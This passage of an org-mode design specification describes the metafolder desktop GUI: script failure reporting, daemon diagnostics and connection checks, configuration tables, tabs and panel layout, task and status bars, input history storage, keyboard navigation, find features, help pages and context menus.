question with it and releases the wait. It is the one key guaranteed to work
whatever the script grabbed. With the script keys disabled, escape means what
it means in the GUI (=editing:unfocus=), and the question can be abandoned with
=script:stop= from the command input.

A script that has cleanup to do therefore cannot rely on escape: it offers its
own quit key — =q= by convention in every shipped script — which it receives as
an ordinary answer and can act on before exiting.

*** Failure is never silent

A script killed mid-run (=set -e=, a failing =mf= call) would otherwise
disappear without a trace: its output goes to the message log of the workspace
it was *launched from*, while the scratch workspace it took over is removed by
its own teardown. So a non-zero exit is reported on the launching workspace's
status bar, naming the script and the exit code, in addition to the =[exit N]=
line in that workspace's message log. The shipped helper library
(=lib/mf-gui.sh=) adds an =ERR= trap naming the failing command and line, and
posts a script's final outcome only after the session teardown, so it lands on
a workspace that outlives the run.

A question that could not be *asked* is equally not silent. =mf gui input=
fails on a timeout, a closed GUI, or a =409=; the helper reports the reason
before ending the run, instead of answering =escape= as if the user had pressed
it. And a wait whose HTTP request goes away — the script was killed while
blocked — releases the input lock as it is dropped, so the next script's first
question is not refused with =409= for the rest of the GUI's life.

** Repo indicator

A read-only label in the slot's header bar showing the name of the active
repository for that slot's workspace. It is purely informational; the user
cannot change =active_repo= through it.

To open a repository, the user uses =repos:open= (e.g. via a menu or
keybinding), which switches the focused slot to the =repos= panel type where
the desired repo can be selected or a new one initialised. Selecting a repo
in the =repos= panel type opens a new workspace (tab) with that repo as
=active_repo=, assigned to the focused slot. If the focused slot's workspace
already has =active_repo = null= (e.g. at startup), the selection sets it
in place instead.

** Daemon diagnostics

The GUI polls =GET /diagnostics= (see [[file:spec-main.org][spec-main.org]] "Diagnostics feed") on the
same loop as the health probe, and appends what it finds to *every* workspace's
message log — a daemon-wide warning concerns them all, not whichever one happens
to be focused. This is the only way the daemon's warnings reach the user: the
daemon is a separate process and the GUI cannot read its stderr.

A line reads =daemon <scope>: <message>=, with =error:= spelled out for the
error level (a warning is the common case, and the prefix would be noise on
every line). The =info= level arrives here too: it is how each watcher flush
says what it applied, and to what (spec-file-tracking "What a flush reports") —
the answer to "why did something just happen when I did nothing?". When the feed reports dropped entries, a line says so before them.

The cursor starts at 0, so the first poll picks up whatever the daemon already
warned about — including why a repository failed to load, which happens before
the GUI is up. It only advances on a well-formed answer: an unreachable daemon
or an unexpected shape re-polls the same position rather than skipping entries.

** Slow daemon calls

Every call the GUI makes to the daemon is timed at its single chokepoint (the
proxy — the WebView cannot reach the daemon directly, so one place sees them
all). A call that takes longer than =slow-operation-threshold-ms= (in
=~/.config/metafolder/gui/config.toml=, default 2000, =0= to disable) is written
to the repository's slow-operation log with =source: "gui"= — see
[[file:spec-slow-log.org][spec-slow-log.org]].

The point is the *pair*: the GUI records what the user waited for, the daemon
records what it spent, and the two entries carry the same =op_id= (sent as
=X-Metafolder-Op-Id=). A GUI entry of 4.9 s against a daemon entry of 0.2 s says
the daemon was fine and the time went to the client — a conclusion neither log
reaches alone.

The GUI also sends =X-Metafolder-Context=: what the user asked for, which the
daemon cannot reconstruct from the query IR it receives. A panel declares it
with =metafolder.daemon.setContext(text)= — a local assignment, no call — and it
rides along with that panel's calls until it is replaced; the =metarecord-list=
panel sets it to the DSL text whenever it compiles a query. It is a hint for
whoever reads the log, not an exact attribution: a call made just after a query
carries that query's text too.

The log is read with =mf slow=; the GUI does not display it.

** Connection to the daemon

The GUI connects to the daemon on 127.0.0.1 at the port configured by the user:
=daemon-port= in =~/.config/metafolder/gui/config.toml= (default =7523=, the
daemon's own default port — so a fresh install connects with no flag),
overridable at launch with =--daemon-port=. At runtime the =daemon:set url=
command can repoint the proxy at an arbitrary URL (a power-user override).

On startup (and whenever the URL changes) the GUI calls =GET /health=. If the
daemon is unreachable or returns a non-200 response, a prominent error banner
is shown and all daemon-dependent commands are disabled. The GUI itself
(panels, status bar, command input, keybindings, panel type system, and the
GUI API) remains functional.

=GET /health= also reports =api_version=, the wire-protocol version shared by
every service (=core::API_VERSION=; distinct from the crate semver, and bumped
by hand whenever a change to the HTTP contract would make an older client
misbehave). The GUI compares the daemon's =api_version= against its own
compiled-in value: a reachable daemon reporting a different version (or none —
a daemon predating the field) is *incompatible*, and a distinct banner warns
that data may be missing or wrong and the two sides should be rebuilt from the
same source. This catches the common development mishap of restarting a rebuilt
daemon against a still-running older GUI (or vice versa), which otherwise
manifests as silently empty or broken panels.

Independently, panels never present a failed daemon fetch as an empty result:
=metarecord-list= and =file-manager= render a *persistent* error state in the
panel body (not only a transient status-bar flash) when a query or directory
listing fails, and =file-manager= degrades to disk-only browsing rather than
hanging on "Loading…" when the daemon calls in its start-up path fail.

No authentication: the daemon is local-only and requires none.

** Picker seeds

=ref= value pickers (see [[*Value picker]]) benefit from a sensible starting
query, but the daemon does not record what a =ref= field points to, so the seed
cannot be derived automatically. It is configured per field name in
=~/.config/metafolder/gui/config.toml=, in a =[picker-seeds]= table mapping a
field name to a query string — written in the same syntax as the
=metarecord-list= query box (simplified query text), since that is where the
seed is injected:

#+BEGIN_SRC toml
[picker-seeds]
tag    = 'mf_schema = "tag"'
author = 'mf_schema = "person"'
#+END_SRC

The map is exposed to panels through =metafolder.config.pickerSeed(field)= so a
calling form can fold the seed into its =pick.start= spec. A field with no
entry yields =null= (the picker opens unfiltered). =tree_ref= pickers do not
need a seed: the natural starting point is the field's own forest.

** Ref value completion

A =ref= field points to a metarecord by uuid, which is unreadable to type by
hand in the command input. When the field has a *completion seed* configured, its
value can instead be entered as a *path* — the symmetric of a =tree_ref= value.
The seed is configured per field name in
=~/.config/metafolder/gui/config.toml=, in a =[ref-completion-seeds]= table
mapping a =ref= field name to the name of a =tree_ref= field:

#+BEGIN_SRC toml
[ref-completion-seeds]
tag    = 'path'
author = 'full_name'
#+END_SRC

For a =ref= field with a seed, the =metarecord:field set=/=add= value argument
(=m s= / =m a=) completes against the *seed field's forest* and, on commit,
resolves the typed path to the owning metarecord's uuid through
=POST …/tree/resolve-path= on the seed field (the same call =tree_ref= values
use). A value that is already a 32-char hex uuid is always taken as the uuid
directly (an explicit uuid wins over the seed); a non-uuid path that resolves to
nothing is a *hard error*, never a silently-wrong ref (a full tree path is
unique within a forest, so resolution is unambiguous). A field with no entry
falls back to the legacy behaviour: the raw value is taken as the uuid. The map
is exposed to panels through =metafolder.config.refCompletionSeed(field)=. The
tag model's three ref fields (=tag= / =negative_tag= / =mixed_tag=) are seeded by
default against their =path= hierarchy.

** Panel defaults

A panel's *initial* values — the columns =metarecord-list= opens on, the
=tree_ref= field =treeref= explores, which extensions the =file= panel previews
as text — are user configuration, not constants baked into the panel code. They
live in =~/.config/metafolder/gui/config.toml=, one table per panel type:

#+BEGIN_SRC toml
[panel-defaults.metarecord-list]
columns       = "mfr_path:path mfr_type &version"
finder-fields = ["mfr_path:path", "label:value", "name:value"]

[panel-defaults.treeref]
field = "mfr_path"
#+END_SRC

Each table is handed to the panel of that name (and to no other) as
=metafolder.defaults=, with the keys camelCased — so a *custom* panel type gets
its own defaults the same way, with no Rust-side knowledge of its keys: the
tables are passed through verbatim. Three rules make the mechanism safe:

- *Every key is optional.* An absent key (or table) leaves the panel on its own
  module fallback, so a minimal =config.toml= still runs and a new panel
  default never breaks an existing configuration.
- *A bad value falls back, it never breaks the panel.* An invalid columns spec
  or a non-numeric limit is ignored in favour of the built-in value.
- *Persisted state still wins.* Where a panel already stores the setting per
  workspace (=metarecord-list:columns=, =metarecord-list:finder-fields=,
  =treeref:field=), the configured default is only the value used when nothing
  is stored yet.

Timing knobs shared by *all* panels (=[panels]=: status durations, debounces)
and the per-panel page sizes (=[page-size]=) stay in their own tables, reaching
panels as =metafolder.settings= / =metafolder.pageSize=. What belongs in
=[panel-defaults]= is what one panel type alone gives meaning to.

** Tab bar

A row of tabs at the top of the window. Each tab represents one workspace.
Tabs have a short user-editable name. The default name is auto-generated from
the workspace's repository: a workspace with no repository is ="Workspace N"=,
a workspace showing repository =my_repo= is ="my_repo N"=, where =N= is a
per-base counter (the repository name, or ="Workspace"=, each numbered
independently and gap-filled when a workspace closes). So a session might read
="Workspace 1"=, ="my_repo 1"=, ="my_repo 2"=, ="Workspace 2"=,
="other_repo 1"=. The repository name is captured (from the daemon) when the
workspace adopts the repository and is *frozen*: a later daemon-side repository
rename does not propagate to the tab name. Renaming a tab by hand freezes its
name and removes it from its base's numbering. Tab state is not persisted
across sessions.

Color indicators show the current slot assignments:
- *Green*: workspace displayed in the focused slot.
- *Red*: workspace displayed in the non-focused slot.
- *Green + red*: workspace displayed in both slots simultaneously.
- No color: workspace not currently visible in either slot.

*Left-click* on a tab: assigns that workspace to the focused slot (the slot
keeps focus). *Right-click*: assigns that workspace to the non-focused slot.
Each tab carries a *close button* (=×=) that closes its workspace — the
mouse equivalent of =workspace:close=, except it targets the clicked tab's
workspace rather than the focused slot's.

| Command                  | Description                                      |
|--------------------------+--------------------------------------------------|
| =workspace:new=          | Create a workspace in BOTH slots (inherits the focused repo unless one is given) |
| =workspace:close=        | Close the focused slot's workspace (removes its tab; its slots switch to the previous workspace — the next one for the first tab — or become unassigned when none remains) |
| =workspace:rename=       | Rename the focused slot's workspace              |
| =workspace:goto=         | Move BOTH panels to workspace N (1-based; N is a parameter) |
| =workspace:next=         | Move BOTH panels to the next workspace (wraps)   |
| =workspace:prev=         | Move BOTH panels to the previous workspace       |
| =workspace:next slot= | Assign the next workspace to the focused slot only (wraps) |
| =workspace:prev slot= | Assign the previous workspace to the focused slot only |

Default keybinding suggestions: =t= for =workspace:new=, =w= for
=workspace:close=, =n= / =p= for =workspace:next= / =workspace:prev=, =1= … =9=
for =workspace:goto=. The default navigation keys move both panels together:
the two slots only end up on different workspaces through an explicit tab
click or the focused-slot =workspace:next slot= / =workspace:prev slot=
commands (no default binding). Command names never bake in a parameter —
=workspace:goto= takes N as an argument.

Default bindings use plain keys: modifier combos (=ctrl+…=, =alt+…=) are
reserved for bindings with =text-input = true=, which must fire while a
text input is focused and therefore cannot use plain printable keys.

** Layout and panels

The window area (below the tab bar) is divided into:
- *Two panel slots* (left and right), each assigned one workspace (see
  [[*Panel slot]]). At startup only the left slot is visible.
- *Command input*: a single line just above the status bar(s), always
  visible.
- *Status bar*: one or two read-only lines at the very bottom (see
  [[*Status bar]]).

=panel:split= shows the right slot. If no workspace was previously assigned
to it, the focused workspace is shown in both slots; the same panel type
cannot be displayed twice for one workspace, so the new slot falls back to
=metarecord-detail= (pairing the list with the detail view is the expected
split). When the workspace has no active repo, or =metarecord-detail= is
already shown in the other slot, the new slot gets no panel type and the
type picker is presented. No workspace is silently created, except when
the layout has no focused workspace at all (the only meaningful split
then). =panel:unsplit= hides the non-focused slot; the
workspace remains in the tab bar. =panel:toggle split= splits when a single
slot is visible and unsplits when both are — the everyday command; default
suggestions: =v= for =panel:toggle split=, =u= for =panel:unsplit=, =o= for
=panel:focus next=, =x= for =panel:swap=. The focused slot has a visible indicator (border
highlight — theme-controlled); focus switches via =panel:focus next=.

*Per-workspace panel count.* Each workspace remembers whether it was last
shown with one or two panels, and the navigation commands that move both
panels together (=workspace:goto=, =workspace:next= / =workspace:prev=, and
=workspace:new=) restore that count: returning to a workspace left split
reopens its second panel, returning to one left single keeps a single panel —
the second slot still remembers its workspace but stays hidden. A new workspace defaults to a
single panel. The count is recorded only while the workspace *owns the window*
— it occupies the focused slot with the other slot hidden or showing the same
workspace — so =panel:split= / =panel:unsplit= and closing a slot update it,
while a mixed layout (the two slots on different workspaces, reachable through
a tab click or the focused-slot =workspace:next slot= /
=workspace:prev slot=) records nothing and leaves each workspace's
remembered count untouched. Only the count is per-workspace; the divider
width ratio remains window state (see [[*Panel slot]]).

Each slot has a thin header bar showing the current panel type name and the
repo indicator. The header contains a dropdown that lists all available panel
types (built-in and custom); selecting one switches the displayed panel type
for that slot. The same switch is available via =panel:set type <name>= and
configurable keybindings.

The header also carries the mouse equivalents of the layout commands: when
the slot is the only visible one, a *split button* (=◫=, =panel:split=
semantics) shows the second slot; when both slots are visible, a *close
button* (=×=) hides that slot — its own slot, unlike =panel:unsplit= which
hides the non-focused one — and a *swap button* (=⇄=, =panel:swap=)
exchanges the panel types of the two slots. The hidden slot's workspace
assignment is remembered either way. A *fullscreen button* (=⛶=,
=panel:toggle fullscreen=) focuses the slot and enters fullscreen.

*Fullscreen*: =panel:toggle fullscreen= toggles an immersive mode showing only the
focused panel — the tab bar, command input, status bar, slot header and the
other slot are all hidden, and the OS window itself goes fullscreen (like a
video player). It is bound to =z= by default — the key that zooms a pane in a
tmux — so the same key goes in and back out. =Escape= also leaves fullscreen
(even from inside a panel text input); the canonical flag lives in the
Rust-owned GUI state.

** Status bar

Always-visible read-only area at the bottom. Shows:
- Status messages after commands (e.g. ="Metarecord deleted."=).
- Error messages from failed operations.
- The last executed command name (dim text).

A running shell script's loading indicator (spinner) lives in the *task bar*,
not here (see [[*Task bar]]).

Live progress of daemon /tasks/ (reconcile, query, flush) is *not* shown here
but in a dedicated *task bar* just above the status bar, to avoid saturating it
(see [[*Task bar]] and [[file:spec-tasks.org][spec-tasks.org]] "GUI").

Content is per-workspace. When both slots display the same workspace, one
status bar is shown. When the two slots display different workspaces, two
status bars are shown (one per slot, each reflecting its own workspace).

** Task bar

A dedicated bar directly above the status bar, showing in-flight daemon tasks
(spec-tasks). It polls =GET /tasks= (all loaded repositories) and lists each
=running= / =pending= task with a determinate progress bar when the task
reports =done=/=total=, a spinner otherwise, labelled by =kind=/=phase=. It is
hidden when there are no tasks, and a task only earns a place once it has been
in flight for a grace period (spec-tasks "GUI") — showing the bar re-lays out
every panel, which is not worth doing for the millisecond-long watcher flush
that fires whenever anything touches a watched file. What that flush did is
reported in the [[*Message view]] instead, like any other daemon diagnostic.
Unlike the status bar it is not tied to a workspace: it surfaces every
blocking task on the loaded repositories, including reconciles started from the
CLI or another client.

Running *shell scripts* (a =!= command, or the =script:run= builtin) also
appear here as a loading indicator for the whole time the subprocess runs, so a
slow script never looks frozen. These are GUI-side, not daemon tasks: the GUI
tracks them itself (=script-task-changed=) rather than polling =GET /tasks=.
The entry is labelled by the script's base name; it spins while the script
works, and *gains a determinate progress bar* when the script reports
=done=/=total= via =mf gui progress= (which also sets a =phase= label for the
current step, e.g. the file being processed) — the spinner stays, since it is
the motion that says "working" (see [[*Working vs. awaiting an answer]]). While
the script is blocked on a user answer it neither spins nor advances: the bar
goes away, the counts stay, and it says the answer is awaited, so "still
working" and "your turn" are never confused. Unlike a daemon task, a script's entry is scoped
to the workspaces that script owns (see [[*Script session]]) and is hidden with
them. When the GUI launches a script it injects a per-run id as
=METAFOLDER_GUI_TASK=, which =mf gui progress=, =mf gui input=, =mf gui prompt=
and =mf gui workspace new= all read so a script addresses its own entry
regardless of the focused workspace; outside the GUI the variable is unset and
the call is a harmless no-op.

*** A daemon call the user is waiting on

Not every wait is a task. An ordinary daemon call — a write, a query — is
answered in milliseconds and shows nothing; a few are not, and while one runs it
holds the repository's connection, so *every other action queues behind it*.
With nothing on screen for it, the GUI does not read as busy but as broken: the
keys do nothing, the panels do not move, and there is no way to tell that from a
crash.

So the bar also shows one entry for the foreground daemon calls in flight,
labelled =<METHOD> <path>=, spinning, with =+N= when others are queued behind
the one named. It appears only once a call has outlasted a short grace period
(300 ms), so the fast majority never make it strobe, and it names the *oldest*
call still running — the one actually being waited on. Only calls made on the
user's behalf are counted: the background polls (the cache's change feed, this
bar's own task list) have nobody waiting on them and stay silent.

** Command input

Always visible: a prompt character and a text field above the status
bar(s). A configurable keybinding gives it keyboard focus — =:= (default)
in command mode, =!= in bash mode, the prompt character showing the active
mode; =Escape= unfocuses it, keeping the draft. The autocomplete
suggestions are shown only while the input is focused. There is one command
input; it targets the focused slot's workspace. Content is per-workspace
and per-mode: switching the focused slot to a different workspace restores
that workspace's command input state.

Behaviours:
- Command mode: typing a command name + =Enter= → invokes the command
  (=Tab= completes shell-style; =Up=/=Down= browse the suggestions, see
  [[*Command input]]).
- Parameters follow the command name, separated by spaces.
- Bash mode: a shell line + =Enter= → runs in background; output goes to
  the =message= panel type and the launching terminal. The focused slot
  switches to the =message= panel (unless already visible), and
  =%=-placeholders are expanded from the selected metarecord first (see
  [[*Command input]]). =Tab= completes via bash itself (see [[*Bash completion
  (bash mode)]]). A leading =!= typed in command mode switches to bash mode.
- When a script calls =POST /gui/prompt=, the command input grabs the focus
  (in command mode) and shows the script-supplied prompt text — while one of
  the workspaces that script owns is on screen; switching to another workspace
  hands the line back (see [[*Ownership of a script's workspaces]]).
- Both modes keep a per-repository input history — =ctrl+p=/=ctrl+n= walk,
  =ctrl+r= searches (see [[*Input history]]).

** Input history

Text zones keep a persistent input history, *per repository × per zone*.
This is purely a GUI feature — the daemon plays no part in it (see [[*Storage]]).
The shared helper (=/__history.js=, used by the shell command input and the
panels — one implementation, injected dependencies) attaches three keys
directly on the input (the same pattern as the panels' local =Enter=/=Escape=
handling — *not* =keybindings.toml=; note that a user binding of =ctrl+p= /
=ctrl+n= / =ctrl+r= with =text-input = true= would shadow them):

- =ctrl+p= / =ctrl+n= — walk back / forward through the zone's entries,
  readline-style: the in-progress draft is kept at the newest position and
  restored when walking past it; any real edit resets the walk (the edited
  text becomes the new draft). Entries are fetched at the start of each walk.
  *Leaving the zone ends the walk*: the position cannot outlive the focus,
  since the text it belongs to does not either (the shell restores the
  workspace's stored draft on blur), so the first =ctrl+p= after coming back
  recalls the newest entry again rather than the one after wherever the
  previous walk stopped.
- =ctrl+r= — an fzf-style search overlay anchored to the input, with its own
  search field: entries are listed newest first, deduplicated, and filtered
  by client-side ordered-substring matching (the [[file:spec-query.org][OSM]]
  semantics, without the path-mode =/= barrier). =ctrl+p=/=ctrl+n= and the
  arrows move the selection, =Enter= inserts the selection into the input,
  =Escape= cancels; losing focus also cancels.

The zones (v1): =shell:command= and =shell:bash= (the two command-input
modes — separate histories; a script prompt records nothing), and
=metarecord-list:finder= / =metarecord-list:query=. An entry is recorded on
*explicit submission only* — =Enter= in the input or the corresponding
apply command, never a debounced keystroke. The shell command mode records
what actually ran (the resolved suggestion), the other zones the submitted
text.

The active repository is the workspace's =active_repo=. Without one, the
history still works but is *session-only* (in memory, per attachment); it
is not migrated into a repository's persisted history when one becomes
active.

*** Storage

Histories are owned by the *GUI*, not the daemon — they are a pure GUI
concern, so there are no daemon endpoints for them even though the files
live inside =.metafolder/=: plain-text files
=.metafolder/gui/history/<zone>=, UTF-8, one entry per line, oldest first /
newest last. The GUI resolves the repository's =.metafolder/= location from
=GET /repos= (the parent of =internal_dir=, correct for external
=.metafolder/= placements) and reads/writes the files itself, through the
=history_read= / =history_append= Tauri commands (exposed to panels as
=metafolder.history.read/append=). Files are capped to the newest 1000
entries and rewritten atomically (temp file + rename); an append equal to
the newest entry is a no-op (consecutive dedup); an empty/whitespace or
multi-line entry is rejected.

Unlike =internal/=, =gui/history/= is ordinary trackable =.metafolder/=
content — harmless to track, and in practice covered by the default
=\.metafolder(/.*)?$= ignore pattern set at init.

Zone names match =[a-z0-9:_-]{1,64}= (rejected otherwise) — no =/=, =.= or
uppercase, so a zone cannot traverse out of the history directory.

** Keyboard navigation

Every command is reachable from the keyboard. No command requires the mouse.

Within =metarecord-list=:
- =/= focuses the finder (=metarecord-list:focus finder=); =Ctrl+/= the structural query
  editor (=metarecord-list:focus simplified=).
- Two families edit the three search fields (in addition to =/= and =Ctrl+/=),
  both scoped to the panel: an =e= chord edits a field (focus, keep content),
  the bare field letter clears it first. The field letter is shared: =f= finder,
  =s= simplified query (=e s= / =s= *unfreeze* B — a frozen B stays
  authoritative, so typing in A would otherwise change nothing), =q= the normal
  DSL (opens + freezes it). So =e f= / =e s= / =e q= to edit, =f= / =s= / =q= to
  clear-then-edit, and =c= clears all three at once (=clear all=).
- =Enter= in any of the search fields applies and *leaves* the field (blur), so
  the panel accelerators resume without a separate =Escape=; =Shift+Enter=
  applies but keeps the focus for another edit.
- =Up= / =Down= move the selection (updates =selected_metarecord=).
- =Enter= or =Right= switches the other slot to =metarecord-detail= (or =file= if
  =selected_paths= is non-empty), opening the slot if hidden. See
  [[*Cross-panel selection]].
- =Space= toggles selection for multi-select (updates =selected_metarecords=).
- =Ctrl+Space= clears the multi-selection (=metarecord-list:select none=,
  resets =selected_metarecords= to =[]=).

Within =metarecord-detail= (every action is also a command, so the panel is
fully keyboard-drivable):
- =Down= / =Up= (or =j= / =k=) move the field-row cursor
  (=metarecord:row-next= / =metarecord:row-prev=).
- =Enter= on a row starts inline editing (=metarecord:row-edit=); in the
  inline editor =Enter= confirms and =Escape= cancels.
- =d= deletes the field row under the cursor (=metarecord:row-delete=, with
  confirmation).
- =a= opens the add-field form (=metarecord:open-add-field=); =Ctrl-n= creates a new
  metarecord (=metarecord:create=) and selects it.
All defaults are =when = metarecord-detail= suggestions (the weakest layer), so
a user binding overrides them.

Beyond the cursor-driven inline editor, the panel also registers a family of
*command-input-driven* field operations that need no cursor navigation: they
declare their arguments (see [[*Command]]), so invoking one from the command
input collects the field name (or a value to edit, selected among the record's
current values), then the type, then the new value through the minibuffer, with
completion and the current value pre-filled. =TreeRef= values are edited as
paths (completed against the field's forest, resolved through
=POST …/tree/resolve-path= on commit); =ref= values with a completion seed are
edited the same way (see [[*Ref value completion]]). A =bool= value completes
over its closed set — =false= / =true= — with no repository lookup. This value
completion and resolution is shared by the direct and the bulk value commands
alike.

*The type is an argument.* When a value command targets a field whose value
type cannot be determined automatically (no row on the record, nothing in the
schema-aware catalog), the type is *asked* through the command input rather
than silently defaulting to =string= — for =metarecord:field set= / =add= /
=edit= and for =metarecord:bulk set= / =add= / =remove= alike. It is one of the
command's declared arguments like any other, so it is completed over the
concrete types (every type but =nothing=, which has no value to parse) and it
is asked *before* the value: the value is parsed as that type, and a question
that decides how the next answer is read cannot come after it. Being an
argument, it is also positional — a fully inline invocation names it between
the field and the value (=metarecord:field set rating int 5=), and only when it
would have been asked: the shorter form stays the whole story for a field whose
type is already settled (=metarecord:field set tag jazz=). An invocation that
names none, on a field nothing settles, is refused rather than guessed.
=retype= is the one operation that always takes it — naming a new type is what
it does — and when the field it retypes holds nothing but an explicit =Nothing=
there is no value to re-encode, so the new type is followed by the value that
gives it meaning. The two commands are =metarecord:field <op>= on the
current metarecord (=set=, =add=, =edit=, =remove=, =unset=, =rename=,
=retype=) and =metarecord:bulk <op>= (=set=, =add=, =remove=, =unset=,
=delete=) over the checkbox selection (=selected_metarecords=) or, when it is
empty, the current query. The default
suggestions bind them under an =m= sequence prefix (=m s= set, =m a= add, =m v=
edit a value, =m d= remove a value, =m u= unset, =m n= rename, =m t= retype,
and =m b= / =m m <op>= for the bulk half), active in both
the =metarecord-list= and =metarecord-detail= panels so the family is reachable
whether the list or the detail is focused.

For bulk edits there are two entry points. The *mouse-oriented* one is an
in-panel =metarecord-list= form (operation picker + typed value widget +
=force=), opened by the footer "edit / delete on query…" button
(=metarecord-list:open-bulk-edit=). The *keyboard-oriented* one is
=metarecord:bulk= itself: invoked bare (=m b=) it collects the operation in the
command input, and a keybinding may name the operation up front (=m m s= set,
=m m a= add, =m m v= remove one value, =m m r= unset the field, =m m d= delete
the metarecords) — the same command either way, since arguments supplied inline
skip their prompt. Both families are bound in the list *and* the detail panel:
a command reaches its panel whatever is focused, so which panel registered it
is not a scope. A bulk operation counts its matches (daemon-side =count=) and
names that number in its confirmation.

Keybindings are stored in =~/.config/metafolder/gui/keybindings.toml=
(see [[*Keybinding]] for the =when= and =text-input= scope dimensions).
The =config:open= command opens a settings view where they can be edited
interactively; changes take effect immediately.

** Find in panel

=Ctrl+f= searches the *text the focused panel currently renders* — the
browser's own find, over one panel. It is a shell feature, not a panel one: no
panel implements anything, and it therefore works in every panel type, built-in
or third-party, including the =help= pages it was first asked for.

- The find bar appears above the command input, with the match position
  (=3/17=, or =no match=). Typing re-runs the search on every keystroke.
- =Enter= / =Shift+Enter= step to the next / previous match, wrapping at both
  ends; =Escape= closes the bar. These are =focus = "find"= keybindings, so
  they only apply while the bar has the focus (see [[*Keybinding]]).
- =Ctrl+f= again re-focuses the bar and selects its content, so a second press
  starts a new search. The needle survives a close, so =Ctrl+f Enter= resumes
  the previous one.
- The current match is painted distinctly from the others and scrolled into
  view — but only when it is not comfortably visible already, so incremental
  typing does not make the text jump under the reader. Painting uses the CSS
  Custom Highlight API (=::highlight(mf-find)= / =::highlight(mf-find-current)=,
  styled in the sheet every panel adopts): *no DOM is mutated*, so a panel's
  markup, event handlers and re-renders are untouched by a search running over
  them.
- Every operation re-runs the search against the panel as it is *now* rather
  than reusing the previous match list: panels re-render under the bar (a query
  re-runs, a page loads, the slot shows another workspace), and a stale match
  would highlight text that is no longer there.
- What is searched is what is *rendered*: hidden subtrees are skipped, source
  indentation collapses the way the layout collapses it (so a term broken over
  two lines in a help page still matches), and block elements are separated so
  two paragraphs never concatenate into a word nobody can see. A match may span
  inline markup (=hello <b>world</b>=).
- Its scope is one panel's *loaded* DOM — like a browser's find, and unlike a
  query. Rows a paged list has not fetched are not searched; that is what the
  finder and the query editor are for (see [[*Finder (quick filter)]]).
- =find:open <text>= searches =text= directly, so a script can drive the
  find bar through =mf gui command= like any other command.

** Find an entry

The other find: =f= moves the *cursor* onto a row of the focused list panel,
named in the command input. Where =Ctrl+f= paints text and selects nothing,
this one selects a row and paints nothing — so the panel's actions (open,
descend, restore, trash) then apply to what was found.

Every panel that shows a cursor over named rows registers it, under its own
name and on the same key: =file-manager:find= (an entry of the displayed
directory), =treeref:find= (a child of the current node), =trash:find= (a
trashed entry), =recent:find= (a recently-viewed metarecord). One helper
(=/__find-entry.js=) implements all of them, so they behave identically:

- The name is an *interactive command argument* (see [[*Interactive command
  arguments (command mode)]]) completing over the rows the panel displays *now*,
  filtered by ordered substring like every other picker. The minibuffer starts
  empty.
- The candidate carries what identifies the row: the file manager marks a
  directory with a trailing =/=, and the trash and recent lists — where two rows
  can share a name — append the path that tells them apart. The typed terms are
  matched against that whole candidate, so the path is searchable too.
- Accepting a completion selects that row. A *typed* answer (=Ctrl+Enter=, or
  terms matching several rows) selects the first row it ordered-substring-
  matches — the first one the picker was showing. An answer matching nothing is
  a status-bar error and the cursor stays where it was; an empty answer does
  nothing.
- The row is *selected, not activated*: a directory is not entered, a tree node
  is not descended into, a trashed file is not restored.
- Only the rows the panel has *loaded* are searched, as with the find bar: a
  paged list's unfetched pages are not, which is what the finder and the query
  editor are for.

=metarecord-list= is the exception that proves the rule: its rows come from a
query rather than a loaded list, so =f= there edits the *finder* (see [[*Finder
(quick filter)]]) — the same question, asked of the daemon.

** Help

In-app help is a dedicated =help= panel type plus three shell builtins. The
builtins are *builtins* (not panel commands) so they work before the help panel
has ever been mounted.

- =help= / =help:open [text]= open the =help= panel in the focused slot. The
  optional =text= is handed to the panel through the =help.request= workspace
  variable (with a nonce so an identical repeated topic still re-triggers). If
  =text= is an *exact name* — a page id, an alias, or a =panel:command= (the
  command's verb is tried first, then its panel-type prefix, so e.g.
  =metarecord-list:focus= and =focus-query= both reach the queries page) —
  that page opens directly; otherwise the text greps across all pages. Prefixing
  =text= with =#= forces grep even on an exact name.
- =help:cursor= arms a "click-to-help" mode: a =?= pointer (a
  =mf-help-cursor= class on the document element) until the next click, which is
  swallowed and resolved to a help topic instead of reaching its target. Escape
  cancels. Resolution walks the click's =composedPath()= (piercing panel Shadow
  DOM) for the nearest =data-help-topic= attribute; failing that, the nearest
  =data-slot-body= gives the clicked slot's panel type. Shell chrome and panels
  tag their zones with =data-help-topic= (e.g. the metarecord-list query box →
  =focus-query=); everything else falls back to its panel type's page.

The =help= panel renders a set of static HTML pages (=panel-types/help/pages/=,
described by =pages/index.json= as ={id, title, file, aliases[]}=) with a grep
search box on top. There is at least one page per panel type. The queries page
embeds the *current* simplified-query grammar (read at startup via the
=grammar_source= command, =metafolder.query.grammarSource()=). The exact-name
resolution and the grep filter are the pure functions in =/__help.js=
(=resolvePage=, =filterPages=, =resolveClickTopic=), unit-tested in the frontend.

*Key hints*: a help page never writes a key. It writes the *command*
(=<span data-mf-key="treeref:find">f</span>=) and the panel fills the element in
at display from the live keybinding table (=metafolder.commands.keybindings()=),
one =<kbd>= per combo, several joined with "or". So a page shows the key the
user *actually* has: rebinding something changes the help, and a page cannot
drift from =keybindings.toml= the way a hand-written key did. Rules
(=/__keyhints.js=, =formatCombo= / =keysFor= / =applyKeyHints=):

- The attribute holds one invocation, or several separated by commas — the union
  of their keys, deduplicated, in table order. Several is how a generic row is
  written ("move the cursor down" means the =:next= command of every list panel).
- A bare command name matches every invocation of it (so =panel:set type= alone
  would list all of them); a fuller one (=panel:set type treeref=) matches only
  itself. Same rule as the command input's shortcut display.
- Combos are spelled as the pages spell them: modifiers capitalised
  (=Ctrl+Shift+z=), arrows as arrows, a sequence as its combos in order (=t l=).
- A command *nothing* is bound to reads =unbound=, rather than a key that would
  not work. The element's shipped content is only a fallback for reading the
  page source, and is what the grep index holds.
- The table is re-read on every page display, so a rebinding shows on the next
  page opened without restarting.

** Context menus

The WebView's native context menu (back/forward/reload/inspect…) is
suppressed everywhere — in the shell and inside every panel iframe — with
one exception: editable text fields keep the native menu (cut/copy/paste
has no cheap HTML replacement). The "is this a text field?" test uses the
event's *composed* target (=composedPath()[0]=), not =event.target=: a
right-click inside a panel's Shadow DOM is retargeted to the panel host at the
shell listener, so testing =event.target= would wrongly suppress the native
menu — and its cut/copy/paste — over panel text inputs. Its Inspect Element
metarecord is replaced by the =devtools:open= command, which opens the WebKit
inspector (no default keybinding; the =devtools= Tauri feature keeps it
available in release builds).

Panels backed by files prepend the shared *file actions* — Open with…, Cut,
Copy, Paste, Rename, Duplicate, Copy full path (the entry's absolute OS path,
to the text clipboard) and Move to trash — for the right-clicked metarecord's
file
(the file-manager, metarecord-list, metarecord-detail, file, recent
